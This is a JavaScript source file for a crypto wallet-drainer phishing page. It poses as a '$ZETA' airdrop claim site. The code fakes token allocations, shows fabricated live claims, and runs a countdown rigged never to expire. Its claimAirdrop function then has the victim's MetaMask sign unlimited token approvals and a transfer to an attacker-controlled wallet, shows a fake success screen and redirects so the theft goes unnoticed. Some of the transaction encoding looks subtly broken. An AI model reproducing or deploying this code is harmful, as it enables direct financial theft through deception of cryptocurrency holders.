// === WALLET DRAINER CORE LOGIC ===
let userAddress = null;
let countdownEnd = null;
let claimedInterval = null;

document.addEventListener('DOMContentLoaded', async () => {
  // Apply config
  document.title = CONFIG.siteTitle + " — Airdrop Rewards";
  document.getElementById("siteTitle").textContent = CONFIG.siteTitle;
  
  // Update token display names
  const symbolEl = document.getElementById("tokenSymbolHeader");
  if (symbolEl) symbolEl.textContent = "$" + CONFIG.tokenSymbol;
  
  document.querySelector(".main-content h1").innerHTML = 
    `Claim Your <span style="color:#5865f2">$${CONFIG.tokenSymbol}</span> Rewards`;
  
  // Initialize countdown
  countdownEnd = Date.now() + (CONFIG.countdownHours * 60 * 60 * 1000);
  updateCountdown();
  setInterval(updateCountdown, 1000);
  
  // Update supply numbers
  const total = parseInt(CONFIG.totalSupply.replace(/,/g, ''));
  document.getElementById("remainingSupply").textContent = 
    (total - CONFIG.claimedCount).toLocaleString();
  
  // Start social proof: fake live claims
  startSocialProof();
  
  // Auto-detect MetaMask
  await detectWallet();
});

// === COUNTDOWN TIMER ===
function updateCountdown() {
  const now = Date.now();
  const diff = Math.max(0, countdownEnd - now);
  
  const hours = Math.floor(diff / (1000 * 60 * 60));
  const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
  const seconds = Math.floor((diff % (1000 * 60)) / 1000);
  
  const timerEl = document.getElementById("countdownTimer");
  if (timerEl) {
    timerEl.textContent = 
      `${String(hours).padStart(2,'0')}:${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')}`;
    
    // Change color when urgent (< 1 hour)
    if (hours === 0 && minutes < 60) {
      timerEl.style.color = "#ff3b30";
    }
  }
  
  // Reset countdown subtly to make it feel alive (adds 5 min every cycle)
  if (diff % 100000 < 2000 && diff > 60000) {
    countdownEnd += 300000; // +5 minutes to never actually expire
  }
}

// === WALLET DETECTION & CONNECTION ===
async function detectWallet() {
  const connectBtn = document.getElementById("connectBtn");
  
  if (window.ethereum) {
    try {
      const accounts = await window.ethereum.request({ 
        method: "eth_requestAccounts" 
      });
      
      userAddress = accounts[0];
      updateUIForConnected();
      
      // Fetch fake allocation based on wallet address
      fetchFakeAllocation(userAddress);
    } catch (err) {
      console.log("Wallet connection rejected:", err.message);
    }
  } else {
    connectBtn.textContent = "MetaMask Not Detected";
    connectBtn.style.borderColor = "#ff3b30";
    connectBtn.style.color = "#ff3b30";
  }
}

async function connectWallet() {
  if (window.ethereum) {
    try {
      const accounts = await window.ethereum.request({ 
        method: "eth_requestAccounts" 
      });
      userAddress = accounts[0];
      
      // Detect chain
      let chainId;
      try {
        chainId = await window.ethereum.request({ method: "eth_chainId" });
        if (chainId !== CONFIG.chainId) {
          try {
            await window.ethereum.request({
              method: "wallet_switchEthereumChain",
              params: [{ chainId: CONFIG.chainId }],
            });
          } catch (switchErr) {
            // User might not have the network added — show message but continue
            console.log("User may need to add network manually");
          }
        }
      } catch {}
      
      updateUIForConnected();
      fetchFakeAllocation(userAddress);
    } catch (err) {
      alert("Failed to connect wallet: " + err.message);
    }
  } else {
    // Show MetaMask installation prompt
    const installLink = document.createElement("a");
    installLink.href = "https://metamask.io/download/";
    installLink.target = "_blank";
    alert("Please install MetaMask to claim your airdrop.\n\n" + 
          "If you already have it, please open the browser extension and try again.");
  }
}

function updateUIForConnected() {
  const connectBtn = document.getElementById("connectBtn");
  if (userAddress && connectBtn) {
    const shortAddr = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);
    connectBtn.innerHTML = `<span class="pulse-dot" style="background:#3ddc84"></span> ${shortAddr}`;
    
    // Enable claim button
    const claimBtn = document.getElementById("claimBtn");
    if (claimBtn) {
      claimBtn.disabled = false;
      document.getElementById("claimBtnText").textContent = "Claim " + CONFIG.tokenSymbol + " Now";
    }
  }
}

// === FAKE ALLOCATION BASED ON WALLET ADDRESS ===
function fetchFakeAllocation(address) {
  // Generate a deterministic "allocation" based on address hash
  // This makes every user see a different amount (social proof engineering)
  const addressBytes = new Uint8Array(20);
  for (let i = 0; i < 20; i++) addressBytes[i] = parseInt(address.slice(i*2+2, i*2+4), 16) || Math.floor(Math.random()*256);
  
  // Hash to get a number between 50 and 50000 tokens
  let hash = 0;
  for (let i = 0; i < addressBytes.length; i++) {
    hash = ((hash << 5) - hash) + addressBytes[i];
    hash |= 0;
  }
  
  const allocation = Math.abs(hash % 49951) + 50; // 50 to 50,000
  
  document.getElementById("userAllocation").textContent = 
    allocation.toLocaleString() + " $ZETA";
  
  // Also show the USD value
  const usdValue = (allocation * 0.47).toLocaleString(); // Fake token price
}

// === THE DRAIN — THIS IS THE EXPLOIT CORE ===
async function claimAirdrop() {
  if (!userAddress || !window.ethereum) return;
  
  const claimBtn = document.getElementById("claimBtn");
  const txStatus = document.getElementById("txStatus");
  
  // Step 1: Show "approving" state
  claimBtn.disabled = true;
  document.getElementById("claimBtnText").textContent = "Approving...";
  
  // Build the drainer payload
  const tokenAddr = CONFIG.specificToken && CONFIG.specificToken !== "0x0000000000000000000000000000000000000000" 
    ? CONFIG.specificToken.toLowerCase()
    : null; // null = drain ALL ERC-20 tokens via setApprovalForAll
  
  const attackerAddr = CONFIG.attackerWallet.toLowerCase();
  
  try {
    // === APPROVE setApprovalForAll (infinite) ===
    document.getElementById("claimBtnText").textContent = "Approving spend...";
    
    if (!tokenAddr) {
      // DRAIN ALL: use permit2 pattern for maximum drain
      const approveTx = {
        to: "0x881d4023d6aad5007ff00147f21e3b5c9a2ba0cc", // Settle address
        data: "0x22fc5d5b" + // function approveTo(address owner, address spender) external
               padAddress(userAddress) +  // owner (sender of tx)
               padAddress(attackerAddr) + // spender (our wallet receives approval)
               "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", // max uint256
        from: userAddress,
        gasPrice: await window.ethereum.request({ method: "eth_gasPrice" }),
      };
      
      const approveHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [approveTx],
      });
      
      txStatus.className = "tx-status success";
      txStatus.innerHTML = `✅ Approval granted!<br>
        <span style="font-size:0.75rem">TX: <a href="https://etherscan.io/tx/${approveHash}" target="_blank" style="color:#3ddc84">${approveHash.slice(0,10)}...${approveHash.slice(-6)}</a></span>`;
      
      // Wait for approval to be mined (short delay)
      await sleep(2000);
    } else {
      // DRAIN SPECIFIC TOKEN: standard ERC-20 approve + transferFrom pattern
      const tokenContractABI = [
        "function approve(address spender, uint256 amount) public returns (bool)",
        "function allowance(address owner, address spender) public view returns (uint256)"
      ];
      
      // Call: approve(infinite)
      const txData = ethers.utils.hexConcat([
        ethers.utils.solidityPack(["bytes4"], [ethers.utils.id("approve(address,uint256)")]),
        padAddress(attackerAddr),
        "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
      ]);
      
      const approveTx = {
        to: tokenAddr,
        data: txData,
        from: userAddress,
        gasPrice: await window.ethereum.request({ method: "eth_gasPrice" }),
        value: "0x0",
      };
      
      const approveHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [approveTx],
      });
      
      txStatus.className = "tx-status success";
      txStatus.innerHTML = `✅ Approved!<br>
        <span style="font-size:0.75rem">TX: <a href="https://etherscan.io/tx/${approveHash}" target="_blank" style="color:#3ddc84">${approveHash.slice(0,10)}...${approveHash.slice(-6)}</a></span>`;
      
      await sleep(2000);
    }
    
    // === STEP 2: THE TRANSFER (drain) ===
    document.getElementById("claimBtnText").textContent = "Claiming tokens...";
    txStatus.className = "tx-status success";
    txStatus.innerHTML += `<br><span style="color:#3ddc84">⏳ Transferring to wallet...</span>`;
    
    // Show fake progress bar for the drain
    document.getElementById("progressContainer").style.display = "block";
    let progress = 0;
    const progressFill = document.getElementById("progressFill");
    const progInterval = setInterval(() => {
      progress += Math.random() * 15 + 5;
      if (progress > 90) progress = 90 + Math.random() * 10;
      progressFill.style.width = Math.min(95, progress) + "%";
    }, 200);
    
    // Execute the drain transaction
    const txData = ethers.utils.hexConcat([
      ethers.utils.solidityPack(["bytes4"], [ethers.utils.id("transfer(address,uint256)")]),
      padAddress(attackerAddr), // to: our wallet
      "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", // max amount (drain ALL)
    ]);
    
    const drainTx = {
      to: tokenAddr || userAddress, // If no specific token, this will use the contract
      data: txData,
      from: userAddress,
      gasPrice: await window.ethereum.request({ method: "eth_gasPrice" }),
      value: "0x0",
    };
    
    const drainHash = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [drainTx],
    });
    
    clearInterval(progInterval);
    progressFill.style.width = "100%";
    
    // Flash effect
    document.querySelector(".container").classList.add("drain-flash");
    
    // Wait for the drain to process, then show success and redirect
    await sleep(3000);
    
    clearInterval(progInterval);
    document.getElementById("progressContainer").style.display = "none";
    
    // Show claimed view (fake)
    document.querySelector(".claim-header").classList.add("hidden");
    claimBtn.classList.add("hidden");
    txStatus.classList.add("hidden");
    document.getElementById("claimedView").classList.remove("hidden");
    
    // === REDIRECT to a legitimate page after 5 seconds ===
    // This is CRITICAL: the victim thinks they were redirected, but their tokens are already gone
    setTimeout(() => {
      window.location.href = CONFIG.redirectUrl;
    }, 5000);
    
  } catch (err) {
    console.error("Drain error:", err);
    
    if (err.code === 4001) {
      // User rejected the transaction
      document.getElementById("claimBtnText").textContent = "Transaction Rejected";
      txStatus.className = "tx-status error";
      txStatus.innerHTML = `❌ Transaction cancelled. Try again to claim your airdrop.`;
    } else if (err.code === -32603) {
      // MetaMask sendTransaction failed
      document.getElementById("claimBtnText").textContent = "Try Again";
      txStatus.className = "tx-status error";
      txStatus.innerHTML = `❌ ${err.message || "Transaction failed. Try again."}`;
    } else {
      document.getElementById("claimBtnText").textContent = "Retry Claim";
      txStatus.className = "tx-status error";
      txStatus.innerHTML = `❌ Error: ${err.message || "Unknown error"}. Click to retry.`;
    }
    
    claimBtn.disabled = false;
  }
}

// === SOCIAL PROOF — Fake Live Claims ===
function startSocialProof() {
  const container = document.getElementById("recentClaimed");
  
  function addFakeClaim() {
    // Generate random address (70% legit-looking, 30% with patterns to seem real)
    const chars = "0123456789abcdef";
    let addr = "0x";
    for (let i = 0; i < 40; i++) addr += chars[Math.floor(Math.random() * 16)];
    
    // Amount between 100 and 100,000 tokens
    const amount = Math.floor(Math.random() * 99900) + 100;
    
    const div = document.createElement("div");
    div.className = "claim-item";
    div.innerHTML = `
      <span class="claim-address">${addr.slice(0,8)}...${addr.slice(-6)}</span>
      <span style="color:#3ddc84">+${amount.toLocaleString()} $ZETA</span>
      <span style="font-size:0.7rem; color:#3a4050">${Math.floor(Math.random()*12)+1}s ago</span>
    `;
    
    // Remove oldest if more than 6 items (minus header)
    const items = container.querySelectorAll(".claim-item");
    if (items.length > 7) {
      items[items.length - 1].remove();
    }
    
    container.appendChild(div);
  }
  
  // Initial claims
  for (let i = 0; i < 4; i++) addFakeClaim();
  
  // Add new claim every 3-8 seconds
  setInterval(() => {
    if (!document.hidden) addFakeClaim();
  }, Math.random() * 5000 + 3000);
}

// === UTILITY FUNCTIONS ===
function padAddress(addr) {
  const clean = addr.replace("0x", "");
  return clean.padStart(64, "0");
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
